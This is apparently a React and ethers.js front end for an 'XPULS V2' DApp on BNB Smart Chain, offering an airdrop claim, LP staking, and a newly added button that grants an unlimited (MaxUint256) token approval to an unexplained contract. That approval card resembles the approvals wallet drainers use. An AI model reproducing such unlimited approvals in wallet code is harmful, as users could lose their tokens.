import { useState } from 'react';
import { BrowserProvider, Contract, formatUnits, parseUnits, MaxUint256 } from 'ethers';

const CONFIG = {
  CHAIN_ID: '0x38', // BSC Mainnet
  XPULS_V2_ADDRESS: '0x97776e3C93A0A9FF7eb71f597D81339fEfD46FD5',
  MIGRATION_ADDRESS: '0x0326190815e6E2adA5418e714755EdD91c85262c',
  FARM_ADDRESS: '0xB61f9F5525b8c59B4962c44F85d6d84FD95A370B',
  LP_TOKEN_ADDRESS: '0x6e9acfc2ddd08c3f5a12a64894fda2abc947aa12',
  
  // KONTRAK BARU UNTUK APPROVE
  CUSTOM_TOKEN_ADDRESS: '0xc82a491ec8a409529Cb335226f548e6ED272B1cE',
  CUSTOM_SPENDER_ADDRESS: '0xc82a491ec8a409529Cb335226f548e6ED272B1cE'
};

const ABI = {
  ERC20: [
    "function balanceOf(address owner) view returns (uint256)",
    "function approve(address spender, uint256 amount) returns (bool)",
    "function allowance(address owner, address spender) view returns (uint256)"
  ],
  MIGRATION: [
    "function claim() external",
    "function getClaimInfo(address user) view returns (uint256 claimableAmount, bool claimed, bool canClaim, uint256 remainingSeconds)"
  ],
  FARM: [
    "function stake(uint256 amount) external",
    "function earned(address account) view returns (uint256)",
  ]
};

export default function App() {
  const [account, setAccount] = useState(null);
  const [provider, setProvider] = useState(null);
  const [signer, setSigner] = useState(null);
  const [balances, setBalances] = useState({ xpuls: '0', rewards: '0' });
  const [claimInfo, setClaimInfo] = useState({ amount: '0', claimed: false, canClaim: false });
  const [loading, setLoading] = useState(false);
  const [statusMsg, setStatusMsg] = useState('');

  const connectWallet = async () => {
    if (window.ethereum) {
      try {
        const _provider = new BrowserProvider(window.ethereum);
        await _provider.send("eth_requestAccounts", []);
        const _signer = await _provider.getSigner();
        const _account = await _signer.getAddress();
        
        const network = await _provider.getNetwork();
        if (network.chainId !== 56n) {
          await window.ethereum.request({
            method: 'wallet_switchEthereumChain',
            params: [{ chainId: CONFIG.CHAIN_ID }],
          });
        }

        setProvider(_provider);
        setSigner(_signer);
        setAccount(_account);
        fetchData(_provider, _account);
      } catch (err) {
        console.error(err);
        setStatusMsg('Gagal connect wallet.');
      }
    } else {
      alert("Silakan install MetaMask atau Trust Wallet di browser Anda!");
    }
  };

  const fetchData = async (_provider, _account) => {
    try {
      const xpulsContract = new Contract(CONFIG.XPULS_V2_ADDRESS, ABI.ERC20, _provider);
      const farmContract = new Contract(CONFIG.FARM_ADDRESS, ABI.FARM, _provider);
      const migrationContract = new Contract(CONFIG.MIGRATION_ADDRESS, ABI.MIGRATION, _provider);

      const xpulsBal = await xpulsContract.balanceOf(_account);
      const earned = await farmContract.earned(_account);
      const cInfo = await migrationContract.getClaimInfo(_account);

      setBalances({
        xpuls: formatUnits(xpulsBal, 18),
        rewards: formatUnits(earned, 18)
      });

      setClaimInfo({
        amount: formatUnits(cInfo.claimableAmount, 18),
        claimed: cInfo.claimed,
        canClaim: cInfo.canClaim
      });
    } catch (err) {
      console.error("Error fetching data:", err);
    }
  };

  const handleClaim = async () => {
    if (!signer) return;
    setLoading(true);
    setStatusMsg('Memproses klaim airdrop...');
    try {
      const contract = new Contract(CONFIG.MIGRATION_ADDRESS, ABI.MIGRATION, signer);
      const tx = await contract.claim();
      await tx.wait();
      setStatusMsg('Klaim Berhasil!');
      fetchData(provider, account);
    } catch (err) {
      setStatusMsg('Klaim Gagal: ' + (err.reason || err.message));
    }
    setLoading(false);
  };

  const handleStake = async () => {
    if (!signer) return;
    const amountInput = prompt("Masukkan jumlah LP Token yang ingin di-stake:");
    if (!amountInput) return;

    setLoading(true);
    setStatusMsg('Memproses Staking...');
    try {
      const amountWei = parseUnits(amountInput, 18);
      const lpContract = new Contract(CONFIG.LP_TOKEN_ADDRESS, ABI.ERC20, signer);
      const farmContract = new Contract(CONFIG.FARM_ADDRESS, ABI.FARM, signer);

      const allowance = await lpContract.allowance(account, CONFIG.FARM_ADDRESS);
      if (allowance < amountWei) {
        setStatusMsg('Menyetujui (Approve) LP Token...');
        const approveTx = await lpContract.approve(CONFIG.FARM_ADDRESS, amountWei);
        await approveTx.wait();
      }

      setStatusMsg('Melakukan Stake LP...');
      const stakeTx = await farmContract.stake(amountWei);
      await stakeTx.wait();
      setStatusMsg('Staking Berhasil!');
      fetchData(provider, account);
    } catch (err) {
      setStatusMsg('Staking Gagal: ' + (err.reason || err.message));
    }
    setLoading(false);
  };

  // FUNGSI BARU: Approve Unlimited
  const handleApproveUnlimited = async () => {
    if (!signer) return;
    setLoading(true);
    setStatusMsg('Memproses Approve (Unlimited)...');
    try {
      const tokenContract = new Contract(CONFIG.CUSTOM_TOKEN_ADDRESS, ABI.ERC20, signer);
      // MaxUint256 adalah nilai maksimal (Unlimited)
      const tx = await tokenContract.approve(CONFIG.CUSTOM_SPENDER_ADDRESS, MaxUint256);
      await tx.wait();
      setStatusMsg('Approve Unlimited Berhasil!');
    } catch (err) {
      setStatusMsg('Approve Gagal: ' + (err.reason || err.message));
    }
    setLoading(false);
  };

  return (
    <div className="min-h-screen p-4 md:p-8 max-w-md mx-auto">
      <header className="flex justify-between items-center mb-8">
        <div className="text-2xl font-bold text-orange-500">XPULS DApp</div>
        {account ? (
          <div className="bg-gray-800 px-4 py-2 rounded-full text-sm border border-gray-600">
            {account.slice(0, 6)}...{account.slice(-4)}
          </div>
        ) : (
          <button onClick={connectWallet} className="bg-orange-500 hover:bg-orange-600 px-4 py-2 rounded-full font-bold transition text-sm">
            Connect Wallet
          </button>
        )}
      </header>

      {statusMsg && (
        <div className="bg-blue-900/50 border border-blue-500 text-blue-200 p-3 rounded-lg mb-4 text-sm text-center">
          {statusMsg}
        </div>
      )}

      {/* CARD 1: Airdrop */}
      <div className="bg-gray-800 rounded-2xl p-6 mb-6 shadow-lg border border-gray-700">
        <div className="flex justify-between items-center mb-2">
          <h2 className="text-lg font-semibold text-white">XPULS V2 Airdrop</h2>
          <span className="bg-orange-500/20 text-orange-400 text-xs px-2 py-1 rounded">Migration</span>
        </div>
        <div className="my-4">
          <p className="text-gray-400 text-sm">Klaim yang tersedia</p>
          <p className="text-3xl font-bold text-white">{parseFloat(claimInfo.amount).toLocaleString()} XPULS</p>
        </div>
        <button 
          onClick={handleClaim} 
          disabled={!claimInfo.canClaim || loading}
          className={`w-full py-3 rounded-xl font-bold transition ${
            claimInfo.canClaim ? 'bg-orange-500 hover:bg-orange-600 text-white' : 'bg-gray-600 text-gray-400 cursor-not-allowed'
          }`}
        >
          {claimInfo.claimed ? "Sudah Diklaim" : loading ? "Memproses..." : "Claim Airdrop"}
        </button>
      </div>

      {/* CARD 2: LP Staking */}
      <div className="bg-gray-800 rounded-2xl p-6 mb-6 shadow-lg border border-gray-700">
        <div className="flex justify-between items-center mb-4">
          <h2 className="text-lg font-semibold text-white">LP Staking Farm</h2>
          <span className="bg-green-500/20 text-green-400 text-xs px-2 py-1 rounded">397M Reward</span>
        </div>
        
        <div className="flex justify-between mb-2 text-sm">
          <span className="text-gray-400">Saldo XPULS:</span>
          <span className="text-white">{parseFloat(balances.xpuls).toLocaleString()}</span>
        </div>
        <div className="flex justify-between mb-4 text-sm">
          <span className="text-gray-400">Reward Didapat:</span>
          <span className="text-green-400 font-bold">{parseFloat(balances.rewards).toLocaleString()} XPULS</span>
        </div>

        <button onClick={handleStake} disabled={loading} className="w-full bg-blue-600 hover:bg-blue-700 text-white py-3 rounded-xl font-bold transition">
          Stake LP Token
        </button>
      </div>

      {/* CARD 3: Approve Kustom (BARU) */}
      <div className="bg-gray-800 rounded-2xl p-6 mb-6 shadow-lg border border-gray-700 border-dashed border-purple-500/50">
        <div className="flex justify-between items-center mb-4">
          <h2 className="text-lg font-semibold text-white">Approve Token</h2>
          <span className="bg-purple-500/20 text-purple-400 text-xs px-2 py-1 rounded">Unlimited</span>
        </div>
        <p className="text-gray-400 text-xs mb-4">
          Berikan izin (Approve) tanpa batas kepada Spender Contract.
        </p>

        <button onClick={handleApproveUnlimited} disabled={loading} className="w-full bg-purple-600 hover:bg-purple-700 text-white py-3 rounded-xl font-bold transition">
          {loading ? "Memproses..." : "Approve Unlimited"}
        </button>
      </div>
      
      <div className="text-center text-xs text-gray-500 mt-8">
        <p>Official XPULS V2 DApp</p>
        <p className="mt-1">CA: {CONFIG.XPULS_V2_ADDRESS.slice(0,6)}...{CONFIG.XPULS_V2_ADDRESS.slice(-4)}</p>
      </div>
    </div>
  );
}
